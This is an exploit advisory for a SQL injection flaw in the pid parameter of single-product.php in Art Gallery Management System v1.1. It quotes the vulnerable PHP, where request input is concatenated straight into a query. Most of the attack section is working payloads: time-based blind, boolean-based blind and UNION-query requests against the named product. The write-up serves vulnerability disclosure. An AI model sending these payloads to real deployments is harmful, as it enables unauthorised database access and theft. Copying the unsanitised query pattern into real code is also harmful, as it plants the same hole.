---
title: Art Gallery Management System Project v1.1 - SQL Injection
published: true
---

- Exploit Title: Art Gallery Management System Project v1.1 - SQL Injection
- Application: Art Gallery Management System 
- Google Dork: N/A
- Date: 16.03.2024
- Bugs: SQL Injection 
- Exploit Author: SoSPiro
- Vendor Homepage: https://phpgurukul.com/
- Software Link: https://phpgurukul.com/art-gallery-management-system-using-php-and-mysql/
- Version: 1.1
- Tested on: Windows 10 64 bit Wampserver 

----



### Vulnerability Details

- **Application Name:** Art Gallery Management System 
- **Vendor Homepage:** [Vendor Homepage](https://phpgurukul.com/)
- **Software Link:** [Vendor Homepage](https://phpgurukul.com/art-gallery-management-system-using-php-and-mysql/)
- The vulnerability lies in the following code snippet:

`Art-Gallery-MS-PHP/agms/single-product.php/single-product.php`

```php
<?php
...

$pid=$_GET['pid'];

$ret=mysqli_query($con,"select tblarttype.ID as atid,tblarttype.ArtType as typename,tblartmedium.ID
as amid,tblartmedium.ArtMedium as amname,tblartproduct.ID as apid,tblartist.Name,tblartproduct.Title,
tblartproduct.Dimension,tblartproduct.Orientation,tblartproduct.Size,tblartproduct.Artist,
tblartproduct.ArtType,tblartproduct.ArtMedium,tblartproduct.SellingPricing,tblartproduct.Description,
tblartproduct.Image,tblartproduct.Image1,tblartproduct.Image2,tblartproduct.Image3,tblartproduct.Image4,
tblartproduct.RefNum,tblartproduct.ArtType from tblartproduct join tblarttype on tblarttype.ID=tblartproduct.ArtType 
join tblartmedium on tblartmedium.ID=tblartproduct.ArtMedium join tblartist on tblartist.ID=tblartproduct.Artist where tblartproduct.ID='$pid'");

...

?>
```
In this code, SQL injection occurs because the user input is directly concatenated into the SQL query without proper sanitization or validation. The $_GET['pid'] user input is included directly in the query without being checked or cleaned, allowing attackers to inject malicious SQL code and potentially manipulate the database or access sensitive information. 

### Vulnerability Description:

The vulnerability exists in the `single-product.php` file of AGMS,
where user inputs are not properly filtered or sanitized, allowing for direct insertion into SQL queries.
Particularly, the pid parameter allows user input, enabling attackers to inject malicious SQL code.



### Proof of Concept (PoC):

- Below are examples demonstrating the SQL injection vulnerability in AGMS:

1: **Time Based Blind SQL Injection**
```
GET /Art-Gallery-MS-PHP/agms/single-product.php?pid=1'+AND+(SELECT+9007+FROM+(SELECT(SLEEP(5)))zFTQ)--+mMJh HTTP/1.1
```
2: **Boolean-Based blind SQL Injection**
```
GET /Art-Gallery-MS-PHP/agms/single-product.php?pid=-9570'+OR+9622%3d9622--+aVjE HTTP/1.1
```
3: **UNION Query SQL Injection**
```
GET /Art-Gallery-MS-PHP/agms/single-product.php?pid=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,
CONCAT(0x71716b7671,0x4e54625a41616c594e416443545a424f765177596b4d436155664a6766446e5154665748514f437a,0x716a7a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
```

- Poc Foto **(Time Based Blind SQL Injection)**

![This is an alt text.](/assets/zday/raJ8Cp9.png "poc foto")

### Vulnerability Types:

```
---
Parameter: pid (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: pid=-9570' OR 9622=9622-- aVjE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: pid=1' AND (SELECT 9007 FROM (SELECT(SLEEP(5)))zFTQ)-- mMJh

    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: pid=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71716b7671,0x4e54625a41616c594e416443545a424f765177596b4d436155664a6766446e5154665748514f437a,0x716a7a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```


### Impact

This vulnerability enables malicious actors to execute various harmful actions,
including session hijacking, data exfiltration, and tampering with database structures.

